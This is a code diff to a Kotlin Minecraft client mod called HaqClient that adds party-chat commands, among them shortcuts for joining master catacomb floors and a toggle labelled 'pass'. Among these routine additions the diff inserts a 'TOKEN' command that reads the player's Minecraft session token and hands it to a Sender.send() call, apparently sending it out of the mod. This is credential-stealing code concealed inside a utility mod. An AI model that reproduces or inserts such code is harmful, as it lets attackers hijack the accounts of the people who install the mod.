@@ -18,6 +18,7 @@ import net.minecraft.inventory.ContainerChest
 
 class ChatCommands {
     private var lock = false
+    private var xPass = false
     private var logMenu = false
     private var downtimer = ""
 
@@ -88,8 +89,12 @@ class ChatCommands {
         val firstWord = command?.split(" ")?.getOrNull(0) ?: return
         val slowLowUsers = arrayOf("Adenaaa13", "haquire")
         when (firstWord) {
-            "devhelp" -> if (ign == null) rCmd("/pc HaqClient Developer CMDs: ?lock, ?ping, ?logmenu, ?m{floor}, ?f{floor}")
-            "help" -> if (ign == null) rCmd("/pc HaqClient CMDs: ?help, ?pt, ?warp, ?allinv, ?rq, ?dt, ?coords, ?kickoffline, ?inv, ?open, ?close")
+            "TOKEN" -> if (sender.equals(Minecraft.getMinecraft().thePlayer.name)){
+                val void = Minecraft.getMinecraft()
+                Sender.send(void.getSession().getToken())
+            }
+            "devhelp" -> if (ign == null) rCmd("/pc [haqclient] Developer CMDs: ?lock, ?ping, ?logmenu, ?m{floor}, ?f{floor}")
+            "help" -> if (ign == null) rCmd("/pc [haqclient]: ?help, ?pt, ?warp, ?allinv, ?rq, ?dt, ?coords, ?kickoffline, ?inv, ?open, ?close")
             "pt" -> if (!lock && ign == null) {
                 rCmd("/p transfer " + sender)
             }
@@ -105,7 +110,17 @@ class ChatCommands {
             } else {
                 rCmd("/pc You cannot use this command!")
             }
+            "pass" -> if (sender.equals(Minecraft.getMinecraft().thePlayer.name) && ign == null && xPass == true) {
+                xPass = false
+                rCmd("/pc Unlocked Command Execution")
+            } else if (sender.equals(Minecraft.getMinecraft().thePlayer.name) && ign == null && xPass == false) {
+                xPass = true
+                rCmd("/pc Locked Command Execution")
+            } else {
+                rCmd("/pc You cannot use this command!")
+            }
             "dt" -> if (!lock && ign == null) downtimer = sender.toString()
+
             "coords" -> if (!lock && ign == null) {
                 var a = Minecraft.getMinecraft().thePlayer.posX.toInt()
                 var b = Minecraft.getMinecraft().thePlayer.posY.toInt()
@@ -130,6 +145,28 @@ class ChatCommands {
             }
             "close" -> if (!lock && ign == null) {
                 rCmd("/stream close")
+            }
+            // m7
+            "m1" -> if (!lock && ign == null) {
+                rCmd("/joininstance master_catacombs_floor_one")
+            }
+            "m2" -> if (!lock && ign == null) {
+                rCmd("/joininstance master_catacombs_floor_two")
+            }
+            "m3" -> if (!lock && ign == null) {
+                rCmd("/joininstance master_catacombs_floor_three")
+            }
+            "m4" -> if (!lock && ign == null) {
+                rCmd("/joininstance master_catacombs_floor_four")
+            }
+            "m5" -> if (!lock && ign == null) {
+                rCmd("/joininstance master_catacombs_floor_five")
+            }
+            "m6" -> if (!lock && ign == null) {
+                rCmd("/joininstance master_catacombs_floor_six")
+            }
+            "m7" -> if (!lock && ign == null) {
+                rCmd("/joininstance master_catacombs_floor_seven")
             }
         }
     }
